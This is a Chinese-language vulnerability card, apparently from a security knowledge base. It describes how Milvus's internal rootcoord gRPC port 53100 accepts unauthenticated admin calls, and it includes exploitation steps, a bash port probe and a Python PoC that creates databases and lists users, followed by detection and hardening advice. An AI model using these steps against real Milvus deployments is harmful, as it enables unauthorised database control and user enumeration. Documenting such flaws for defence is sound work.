---
id: web-generic-auth-milvus-rootcoord-53100-unauthenticated
title: Milvus rootcoord 内部 gRPC 53100 未接认证拦截器：容器网络内直连即 full admin
type: scenario
domain: web
path: web/generic/auth
technique: internal-port-missing-auth-interceptor
tags:
- milvus
- vector-database
- auth-bypass
- internal-port
- grpc
- container-network
- network-trust
- full-admin
cve: []
severity: high
confidence: high
affected_versions: 2.6.4、2.6.5 实测受影响；2.6.10 起不再监听
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V67
  verified_at: '2026-11-05T11:58:01+08:00'
  notes: 已对照原文全文与12张内联截图核对：容器 IP 172.22.0.4、53100 OPEN、未认证 ListDatabases code=0、2.6.5 未认证 CreateDatabase(hack_db) 成功且 root 交叉验证存在、2.6.10 端口不可达，均与原文一致。affected_versions 按原文实测版本设置（原文未给正式 semver 区间，仅 2.6.4/2.6.5 实测受影响、2.6.10 起不再监听）。未验证点：未实际执行 PoC；利用前提为容器网络可达，卡内已注明；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-milvus-rootcoord-53100-unauthenticated/
draft: false
kb_aliases:
- Milvus 53100 未认证
- rootcoord 内部端口裸奔
- Milvus 容器网络横向
- 内部 gRPC 无认证
- Milvus 内部端口 full admin
---

## 一句话结论

Milvus 的认证拦截器只注册在 proxy 的 19530 gRPC server 上，rootcoord 自己的内部 gRPC 端口 53100 完全没有认证；任何能访问容器网络内 53100 的人（同网络被攻破的容器、SSRF/RCE 落点、误映射到宿主机的端口）无需 header、无需凭据即可直连并执行建库、列用户等 full admin 操作。

## 原理

- Milvus 的 `AuthenticationInterceptor` 只挂在 proxy 的 gRPC server（19530）上；rootcoord 等内部组件各自监听内部 gRPC 端口（rootcoord 为 53100），这些 server 没有注册认证拦截器。
- 设计假设是“内部端口只在受信任的网络里暴露，所以不需要认证”。在 Docker standalone 部署中，53100 绑定在容器网络（如 172.22.0.4:53100），同网络的任何容器、或通过 SSRF/RCE 进入容器网络的攻击者都能直连。
- 由于没有认证层，攻击者直接调用 rootcoord 的 gRPC 方法即可：`ListDatabases` 返回所有库、`CreateDatabase` 未认证建库、`ListCredUsers` 列出用户。原文在 2.6.4 与 2.6.5 上均验证成功，并用真实 root 登录交叉确认新建数据库存在。
- 与 sourceid 后门不同，这条链连 `sourceid` header 都不需要——不是“绕过认证”，而是目标端口根本没有认证逻辑。
- 2.6.10 的处置不是加认证，而是让 53100 不再监听；原文在 2.6.10 容器内扫描确认端口不可达。因此 2.6.10 之前（含已修复 sourceid 的 2.6.5）仍受此问题影响。

## 触发条件

- Milvus 版本 ≤ 2.6.5（2.6.10 起端口不再监听）。
- 攻击者能访问容器网络内的 53100：同 Docker 网络的其他容器、被 SSRF/RCE 拿下的旁路服务、共享网络命名空间、或运维误把内部端口映射到宿主机/公网。
- 公网攻击者无法直达 53100，除非端口被显式映射或安全组放行；这是本手法与 sourceid 后门的关键区别。

## 利用步骤

1. 获取目标容器 IP：`docker inspect <milvus_container> --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'`（在已进入容器网络的前提下）。
2. 扫描常见内部端口，确认 53100 开放；19530/9091 通常也开放，但 53100 是内部 rootcoord。
3. 用 milvus-proto 生成的 gRPC stub 直连 `IP:53100`，不带任何认证 metadata，调用 `ListDatabases`。
4. 未认证调用 `CreateDatabase` 建库，再用真实 root 登录 19530 交叉验证数据库存在。
5. 调用 `ListCredUsers` 枚举用户，继续尝试集合与数据操作，确认 full admin。
6. 若 53100 不可达，回到 19530/9091 尝试其他认证缺陷；若可达，则无需任何 payload。

## PoC

```bash
# 1) 容器网络内确认 53100 开放
IP=$(docker inspect milvus --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
for p in 53100 19530 9091; do
  (timeout 2 bash -c "echo > /dev/tcp/$IP/$p" 2>/dev/null && echo "$p OPEN") || echo "$p closed"
done

# 2) 直连 rootcoord 内部 gRPC，不带认证
python3 - <<'PY'
# 依赖 milvus-proto 生成的 stub
stub.ListDatabases(ListDatabasesRequest())          # code=0，返回全部数据库
stub.CreateDatabase(CreateDatabaseRequest(db_name="hack_db"))  # code=0
stub.ListCredUsers(ListCredUsersRequest())          # code=0，返回用户列表
PY
```

```text
[53100] ListDatabases  code=0  dbs=['default', 'evil_db']   <- 未认证
[53100] CreateDatabase code=0
[交叉验证 root 登录] 数据库=['default', 'hack_db']          <- hack_db 真实存在
```

## 变体与关联

- 变体：distributed 部署下内部组件更多、内部端口更多，任何只依赖网络边界而不做认证的内部 gRPC 服务都可能有同类问题。
- 变体：若 53100 被误映射到宿主机或安全组放行，公网攻击者也可直达，此时无需先进入容器网络。
- 变体：常与 SSRF 组合——先通过内网某个 URL 拉取功能探测 53100，再直连；原文把这条列为“组合路径”。
- 关联：[[web-generic-auth-milvus-sourceid-header-backdoor-fake-identity]]（proxy 层后门）、[[web-generic-auth-milvus-9091-expr-weak-token-unauth]]（管理端口弱 token）；三者构成 Milvus 认证边界的三层缺陷。
- 边界：2.6.10 起端口不再监听；若网络隔离严格、容器网络内无可信外服务且无 SSRF/RCE 落点，本手法不可达。

## 检测与防御

- 检测：扫描容器网络与宿主机映射端口，确认 53100 等内部 gRPC 端口是否可从非可信网络访问；检查 Docker Compose/安全组是否映射了内部端口。
- 检测：监控对 53100 的直连与 gRPC 方法调用，尤其是来自非 Milvus 组件容器的连接；关注未认证的 `CreateDatabase`、`ListCredUsers` 调用。
- 防御：升级到 2.6.10+（53100 不再监听）；不能升级时用网络策略限制 53100 只允许可信 Milvus 组件访问。
- 防御：容器网络内不要部署不可信服务；对内部 gRPC 增加 mTLS 或认证，不把安全边界只建立在“内网可信”上。
- 加固：最小化端口映射，管理端口与内部端口不暴露到宿主机/公网；把内部端口扫描纳入上线与巡检基线。
